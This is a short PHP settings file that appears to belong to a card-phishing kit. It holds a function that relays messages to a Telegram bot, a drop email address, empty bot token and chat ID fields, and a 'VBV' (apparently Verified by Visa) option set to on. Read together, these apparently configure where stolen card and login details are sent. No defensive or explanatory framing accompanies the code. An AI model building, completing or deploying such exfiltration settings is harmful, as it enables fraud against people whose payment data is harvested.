<?php

# Function Set-Up
function sendMessage($chatID, $messaggio, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
  }

# E-Mail Set-Up
$email = "tonsibg@yandex.com";

# Telegram Set-Up
$token = "";
$chat_id = "";

# VBV Set-Up
$vbv = "yes";

?>